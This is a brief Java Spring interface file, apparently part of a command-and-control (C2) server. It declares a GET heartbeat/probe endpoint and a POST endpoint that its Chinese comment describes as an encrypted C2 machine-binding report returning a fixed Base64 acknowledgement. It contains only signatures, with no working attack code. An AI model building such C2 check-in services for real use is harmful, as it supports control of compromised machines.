package com.binding.service;

import javax.servlet.http.HttpServletRequest;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import com.binding.response.ProbeResponse;

@RequestMapping("/a")
public interface BindingService {

    /**
     * GET /a 心跳/探测
     */
    @GetMapping
    ResponseEntity<ProbeResponse> probe(HttpServletRequest request);

    
    /**
     * POST /a 加密 C2 绑机上报(新版逻辑)
     * 响应路径不校验明文，固定 Base64 ACK，带 x-ts
     */
    @PostMapping
    ResponseEntity<byte[]> bindReportPost(HttpServletRequest request);
}
